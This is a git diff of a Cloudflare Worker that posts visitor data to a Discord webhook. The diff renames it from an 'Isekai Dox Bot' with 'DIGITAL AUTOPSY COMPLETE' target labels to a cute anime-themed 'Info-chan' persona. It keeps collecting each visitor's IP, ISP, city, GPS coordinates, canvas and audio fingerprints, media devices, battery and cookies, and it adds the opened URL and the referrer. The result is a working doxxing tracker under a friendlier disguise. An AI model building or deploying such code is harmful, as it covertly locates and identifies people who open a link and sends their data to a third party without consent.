@@ -1,5 +1,5 @@
 /**
- * Cloudflare Worker — Maximum Brutality Notifier
+ * Cloudflare Worker — Isekai Info-chan ✨
  */
 
 const CORS = {
@@ -39,80 +39,112 @@ function parseBrands(brandsJson) {
 
 function buildEmbed(data) {
   const gpsValue = (data.lat && data.lon)
-    ? `[🗺️ View Map](https://maps.google.com/?q=${data.lat},${data.lon})\nLat: ${data.lat}, Lon: ${data.lon}`
-    : "Unknown";
+    ? `[🗺️ Lihat Peta](https://maps.google.com/?q=${data.lat},${data.lon})\nLat: \`${data.lat}\`, Lon: \`${data.lon}\``
+    : "*uwu~ lokasi GPS tidak ketemu~ (◡︿◡✿)*";
+
+  const urlValue = data.url
+    ? `[🔗 Klik di sini nyaa~](${data.url})\n\`${s(data.url, 200)}\``
+    : "—";
+
+  const referrerValue = data.referrer
+    ? `[🌸 Dari sini~](${data.referrer})\n\`${s(data.referrer, 200)}\``
+    : "*langsung dibuka nyaa~ (ﾉ◕ヮ◕)ﾉ*";
 
   const fields = [
-    { name: "🎯 TARGET STATUS", value: `\`\`\`DIGITAL AUTOPSY COMPLETE\`\`\``, inline: false },
     {
-      name: "🌐 IP & LOCATION",
-      value: `IP: \`${s(data.ip)}\`\nISP: ${s(data.isp)}\nCity: ${s(data.city)}\nRegion: ${s(data.region)}\nCountry: ${s(data.country)}\nProxy: ${bool(data.proxy)}\nHosting: ${bool(data.hosting)}\nASN: ${s(data.asn)}`,
-      inline: false
-    },
-    { name: "📡 GPS", value: gpsValue, inline: false },
-    {
-      name: "💻 HARDWARE",
-      value: `CPU: ${s(data.hardwareConcurrency)} cores\nRAM: ${s(data.deviceMemory)} GB\nGPU Vendor: ${s(data.vendor)}\nGPU Renderer: ${s(data.renderer)}\nWebGL Ver: ${s(data.version)}\nWebGPU: ${bool(data.webgpu)}\nTouch Points: ${s(data.maxTouchPoints)}\nSensors: Accel:${s(data.accel)} Gyro:${s(data.gyro)} Mag:${s(data.mag)}`,
+      name: "🔗 ✨ Link Yang Dibuka Onii-chan~",
+      value: urlValue,
       inline: false
     },
     {
-      name: "🖥️ DISPLAY",
-      value: `Res: ${s(data.width)}x${s(data.height)}\nAvail: ${s(data.availWidth)}x${s(data.availHeight)}\nPixel Ratio: ${s(data.pixelRatio)}\nColor Depth: ${s(data.colorDepth)} bit\nOrientation: ${s(data.orientation)} (${s(data.orientationAngle)}°)\nInner: ${s(data.innerWidth)}x${s(data.innerHeight)}`,
+      name: "🌸 Datang Dari Mana Nyaa~",
+      value: referrerValue,
       inline: false
     },
     {
-      name: "📱 PLATFORM & OS",
-      value: `Platform: ${s(data.platform)}\nMobile: ${bool(data.mobile)}\nModel: ${s(data.model)}\nArch: ${s(data.architecture)}\nBitness: ${s(data.bitness)}\nUA Brands: ${data.brands ? parseBrands(data.brands) : "—"}`,
+      name: "🌐 IP & Lokasi Desu~",
+      value: `📍 IP: \`${s(data.ip)}\`\n🏢 ISP: ${s(data.isp)}\n🏙️ Kota: ${s(data.city)}\n🗾 Region: ${s(data.region)}\n🌍 Negara: ${s(data.country)}\n🕵️ Proxy: ${bool(data.proxy)}\n☁️ Hosting: ${bool(data.hosting)}\n📡 ASN: ${s(data.asn)}`,
       inline: false
     },
     {
-      name: "🔊 AUDIO & CANVAS",
-      value: `Audio FP: \`${s(data.audioFingerprint, 80)}\`\nCanvas FP: \`${s(data.canvasFingerprint, 64)}\``,
+      name: "📡 GPS Nyaa~",
+      value: gpsValue,
       inline: false
     },
     {
-      name: "💾 STORAGE",
-      value: `LocalStorage: ${bool(data.localStorage)}\nSessionStorage: ${bool(data.sessionStorage)}\nIndexedDB: ${bool(data.indexedDB)}\nService Worker: ${bool(data.serviceWorker)}\nCache API: ${bool(data.cacheAPI)}\nCookies: ${s(data.cookies)}\nDo Not Track: ${s(data.doNotTrack)}\nCookie Enabled: ${bool(data.cookieEnabled)}`,
+      name: "💻 Hardware-kun~",
+      value: `⚙️ CPU: \`${s(data.hardwareConcurrency)} cores\`\n🧠 RAM: \`${s(data.deviceMemory)} GB\`\n🎮 GPU Vendor: ${s(data.vendor)}\n🖥️ GPU Renderer: ${s(data.renderer)}\n🔷 WebGL Ver: ${s(data.version)}\n🚀 WebGPU: ${bool(data.webgpu)}\n👆 Touch Points: ${s(data.maxTouchPoints)}\n📳 Sensor: Accel:${s(data.accel)} Gyro:${s(data.gyro)} Mag:${s(data.mag)}`,
       inline: false
     },
     {
-      name: "🎥 MEDIA DEVICES",
-      value: `Audio Inputs: ${arr(data.audioIn)}\nVideo Inputs: ${arr(data.videoIn)}\nAudio Outputs: ${arr(data.audioOut)}`,
+      name: "🖥️ Layar-chan Desu~",
+      value: `📐 Resolusi: \`${s(data.width)}x${s(data.height)}\`\n📏 Avail: \`${s(data.availWidth)}x${s(data.availHeight)}\`\n🔍 Pixel Ratio: \`${s(data.pixelRatio)}\`\n🎨 Color Depth: \`${s(data.colorDepth)} bit\`\n🔄 Orientasi: ${s(data.orientation)} (${s(data.orientationAngle)}°)\n🪟 Inner: \`${s(data.innerWidth)}x${s(data.innerHeight)}\``,
       inline: false
     },
     {
-      name: "🔋 BATTERY",
-      value: `Level: ${s(data.level)}\nCharging: ${bool(data.charging)}`,
+      name: "📱 Platform & OS-kun~",
+      value: `🖥️ Platform: ${s(data.platform)}\n📲 Mobile: ${bool(data.mobile)}\n📋 Model: ${s(data.model)}\n⚙️ Arch: ${s(data.architecture)}\n🔢 Bitness: ${s(data.bitness)}\n🏷️ UA Brands: ${data.brands ? parseBrands(data.brands) : "—"}`,
       inline: false
     },
     {
-      name: "🌐 NETWORK",
-      value: `Type: ${s(data.connectionType)}\nEffective: ${s(data.effectiveConnection)}\nDownlink: ${s(data.downlink)} Mbps\nRTT: ${s(data.rtt)} ms\nSave Data: ${bool(data.saveData)}\nOnline: ${bool(data.online)}`,
+      name: "🔊 Audio & Canvas Fingerprint~",
+      value: `🎵 Audio FP: \`${s(data.audioFingerprint, 80)}\`\n🎨 Canvas FP: \`${s(data.canvasFingerprint, 64)}\``,
       inline: false
     },
     {
-      name: "🌍 LOCALE",
-      value: `Language: ${s(data.language)}\nLanguages: ${s(data.languages)}\nTimezone: ${s(data.timezone)}\nCurrency: ${s(data.currency)}\nCalendar: ${s(data.calendar)}\nNumbering: ${s(data.numberingSystem)}`,
+      name: "💾 Storage Onii-chan~",
+      value: `📦 LocalStorage: ${bool(data.localStorage)}\n📂 SessionStorage: ${bool(data.sessionStorage)}\n🗄️ IndexedDB: ${bool(data.indexedDB)}\n👷 Service Worker: ${bool(data.serviceWorker)}\n⚡ Cache API: ${bool(data.cacheAPI)}\n🍪 Cookies: ${s(data.cookies)}\n🚫 Do Not Track: ${s(data.doNotTrack)}\n✅ Cookie Enabled: ${bool(data.cookieEnabled)}`,
       inline: false
     },
     {
-      name: "🧩 BROWSER FEATURES",
-      value: `WebGL2: ${bool(data.webgl2)}\nWebGPU: ${bool(data.webgpu)}\nWebRTC: ${bool(data.webrtc)}\nCSS Grid: ${bool(data.cssGrid)}\nFlexbox: ${bool(data.flexbox)}\nFetch API: ${bool(data.fetchAPI)}\nPromise: ${bool(data.promise)}`,
+      name: "🎥 Media Devices-chan~",
+      value: `🎤 Audio Input: ${arr(data.audioIn)}\n📷 Video Input: ${arr(data.videoIn)}\n🔈 Audio Output: ${arr(data.audioOut)}`,
       inline: false
     },
     {
-      name: "🔌 PLUGINS & MIME",
-      value: `Plugins: ${s(data.plugins) || "—"}\nMIME Types: ${s(data.mimeTypes) || "—"}`,
+      name: "🔋 Baterai Nyaa~",
+      value: `⚡ Level: ${s(data.level)}\n🔌 Charging: ${bool(data.charging)}`,
       inline: false
     },
-    { name: "📜 USER AGENT", value: `\`\`\`${s(data.userAgent, 200)}\`\`\``, inline: false },
+    {
+      name: "🌐 Jaringan Desu~",
+      value: `📶 Tipe: ${s(data.connectionType)}\n🚀 Effective: ${s(data.effectiveConnection)}\n⬇️ Downlink: ${s(data.downlink)} Mbps\n⏱️ RTT: ${s(data.rtt)} ms\n💡 Save Data: ${bool(data.saveData)}\n🌍 Online: ${bool(data.online)}`,
+      inline: false
+    },
+    {
+      name: "🌍 Locale Info-chan~",
+      value: `🗣️ Bahasa: ${s(data.language)}\n📚 Languages: ${s(data.languages)}\n⏰ Timezone: ${s(data.timezone)}\n💴 Currency: ${s(data.currency)}\n📅 Calendar: ${s(data.calendar)}\n🔢 Numbering: ${s(data.numberingSystem)}`,
+      inline: false
+    },
+    {
+      name: "🧩 Fitur Browser-kun~",
+      value: `🔷 WebGL2: ${bool(data.webgl2)}\n🚀 WebGPU: ${bool(data.webgpu)}\n📹 WebRTC: ${bool(data.webrtc)}\n📊 CSS Grid: ${bool(data.cssGrid)}\n📐 Flexbox: ${bool(data.flexbox)}\n📡 Fetch API: ${bool(data.fetchAPI)}\n🤝 Promise: ${bool(data.promise)}`,
+      inline: false
+    },
+    {
+      name: "🔌 Plugins & MIME Nyaa~",
+      value: `🧩 Plugins: ${s(data.plugins) || "—"}\n📄 MIME Types: ${s(data.mimeTypes) || "—"}`,
+      inline: false
+    },
+    {
+      name: "📜 User Agent Desu~",
+      value: `\`\`\`${s(data.userAgent, 200)}\`\`\``,
+      inline: false
+    },
   ];
 
   return {
-    color: 0xFF003C,
-    author: { name: "🔬 MAXIMUM BRUTALITY DOX", icon_url: "https://img.icons8.com/color/96/target.png" },
+    color: 0xFF85C1,
+    author: {
+      name: "✨ Isekai Info-chan melaporkan~ (｡♥‿♥｡)",
+      icon_url: "https://img.icons8.com/color/96/kawaii-gummy-bear.png"
+    },
+    title: "🌸 Laporan Pengunjung Baru Nyaa~ 🌸",
+    description: `> *Ara ara~ ada tamu baru masuk ke dunia isekai! Info-chan sudah mengumpulkan semua datanya desu~ (≧◡≦) ✨*`,
     fields,
-    footer: { text: `Isekai Dox Engine v100 • ${waktuWIB()}` },
+    footer: {
+      text: `🎀 Isekai Info-chan Engine v100 ✨ • ${waktuWIB()} • がんばってね！`
+    },
     timestamp: new Date().toISOString()
   };
 }
@@ -133,8 +165,8 @@ export default {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          username: "Isekai Dox Bot 🔬",
-          avatar_url: "https://img.icons8.com/color/96/target.png",
+          username: "Isekai Info-chan ✨",
+          avatar_url: "https://img.icons8.com/color/96/kawaii-gummy-bear.png",
           embeds: [buildEmbed(data)]
         })
       });
